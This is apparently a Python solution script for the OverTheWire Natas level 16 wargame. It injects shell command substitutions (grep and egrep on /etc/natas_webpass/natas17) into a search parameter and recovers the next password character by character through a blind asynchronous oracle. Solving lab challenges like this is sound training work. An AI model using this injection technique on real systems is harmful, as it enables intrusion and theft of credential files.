#!/usr/bin/env python3
import asyncio
from aiohttp import BasicAuth, ClientSession


url = 'http://natas16.natas.labs.overthewire.org/index.php?needle={}password&submit'
auth = BasicAuth('natas16', natas16_pass)

async def search_string(search, data):
    async with ClientSession() as session:
        async with session.get(url.format(search), auth=auth) as response:
            r = await response.text()
            if 'password' not in r:
                return data

async def get_charset():
    alnum = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'
    tasks = []
    charset = ''
    for char in alnum:
        search = f'$(grep {char} /etc/natas_webpass/natas17)'
        tasks.append(asyncio.ensure_future(search_string(search, char)))
    for task in asyncio.as_completed(tasks):
        if result := await task:
            charset += result
    return charset

async def get_substr(index, charset):
    tasks = []
    for char in charset:
        search = f'$(egrep ^.{{{index}}}{char} /etc/natas_webpass/natas17)'
        tasks.append(asyncio.ensure_future(search_string(search, char)))
        # Add delay to prevent too many simultaneous requests
        # Increase delay if receiving connection refused error
        # await asyncio.sleep(.01)
    for task in asyncio.as_completed(tasks):
        if result := await task:
            for t in tasks:
                t.cancel()
            return index, result

async def main():
    charset = await get_charset()

    tasks = []
    for i in range(32):
        tasks.append(asyncio.ensure_future(get_substr(i, charset)))
    password = ['_'] * 32
    for task in asyncio.as_completed(tasks):
        index, char = await task
        print(''.join(password), end='', flush=True)
        print('\b'*32, end='', flush=True)
        password[index] = char
    print(''.join(password))


if __name__ == '__main__':
    loop = asyncio.get_event_loop()
    future = asyncio.ensure_future(main())
    loop.run_until_complete(future)
